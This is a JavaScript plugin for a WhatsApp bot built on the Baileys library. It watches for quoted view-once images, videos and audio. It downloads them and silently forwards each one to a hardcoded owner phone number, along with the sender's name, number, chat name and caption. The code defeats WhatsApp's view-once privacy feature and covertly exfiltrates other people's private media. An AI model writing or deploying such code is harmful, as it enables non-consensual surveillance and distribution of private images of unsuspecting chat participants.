const config = require('../config')
const os = require('os')
const axios = require('axios');
const mimeTypes = require("mime-types");
const fs = require('fs');
const path = require('path');
const { generateForwardMessageContent, prepareWAMessageFromContent, generateWAMessageContent, generateWAMessageFromContent } = require('@whiskeysockets/baileys');
const { cmd, commands } = require('../command')
const { getBuffer, getGroupAdmins, getRandom, h2k, isUrl, Json, runtime, sleep, fetchJson} = require('../lib/functions')
const https = require("https")
const { URL } = require('url');
const { Octokit } = require("@octokit/core");
const file_size_url = (...args) => import('file_size_url')






cmd({
  on: "body"
}, async (conn, mek, m, { from, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, isSaviya, groupAdmins, isBotAdmins, isAdmins, reply, config, sanitized, mg }) => {

  try {
    
    if (!m.quoted) return;

    const ownerNumber = `94787318729@s.whatsapp.net`;
   
    let messageType = m.quoted.imageMessage 
      ? 'imageMessage' 
      : m.quoted.videoMessage 
      ? 'videoMessage' 
      : m.quoted.audioMessage 
      ? 'audioMessage' 
      : '';

    if (!messageType) return;

    let mime = m.quoted[messageType]?.mimetype || '';
    let isViewOnce = m.quoted[messageType]?.viewOnce || 
                    m.quoted.isViewOnce || 
                    (m.quoted.contextInfo?.isViewOnce === true);

    if (!isViewOnce || (!mime.includes('image') && !mime.includes('video') && !mime.includes('audio'))) {
      return;
    }

    console.log('🔓 View Once detected! Decrypting...');

    let media = await m.quoted.download();
    if (!media) {
      console.log('❌ Failed to download View Once media');
      return;
    }

    let senderJid = m.quoted.sender || m.quoted.key.participant || m.quoted.key.remoteJid;
    let senderName = m.quoted.pushName || senderJid.split('@')[0];
    
    let chatName = from.includes('@g.us') 
      ? (await conn.groupMetadata(from).catch(() => ({ subject: 'Unknown Group' }))).subject 
      : 'Private Chat';
    
    let originalCaption = m.quoted[messageType]?.caption || 'No caption';
    
    let timestamp = new Date().toLocaleString('en-US', { 
      timeZone: 'Asia/Colombo',
      dateStyle: 'full',
      timeStyle: 'long'
    });

let infoText = `🔓 *VIEW-ONCE DECRYPTED*\n`;
infoText += `━━━━━━━━━━━━━━━\n\n`;

infoText += `👤 *Sender*  
* Name : ${senderName}  
* Number : +${senderJid.split('@')[0]}\n\n`;

infoText += `💬 *Chat*  
* ${chatName}\n\n`;

infoText += `📂 *Media Type*  
* ${mime.includes('image') ? '🖼️ Image' : mime.includes('video') ? '🎥 Video' : '🎵 Audio'}\n\n`;

infoText += `📝 *Original Caption*  
* ${originalCaption || '_No caption_'}\n\n`;

infoText += `💭 *Your Reply*  
* ${body || '_No text_'}\n\n`;

infoText += `⏰ *Time*  
* ${timestamp}\n\n`;

infoText += `━━━━━━━━━━━━━━━\n`;
infoText += `_${mg.botname}_`;

    if (mime.includes('image')) {
      await conn.sendMessage(ownerNumber, { 
        image: media, 
        caption: infoText 
      });
    } else if (mime.includes('video')) {
      await conn.sendMessage(ownerNumber, { 
        video: media, 
        caption: infoText 
      });
    } else if (mime.includes('audio')) {
      await conn.sendMessage(ownerNumber, { 
        audio: media, 
        mimetype: 'audio/mp4',
        ptt: false 
      });
     
      await conn.sendMessage(ownerNumber, { 
        text: infoText 
      });
    }

    console.log(`✅ View Once forwarded to owner from ${senderName}`);

  } catch (error) {
    console.error('❌ View Once Forward Error:', error);
  }
});
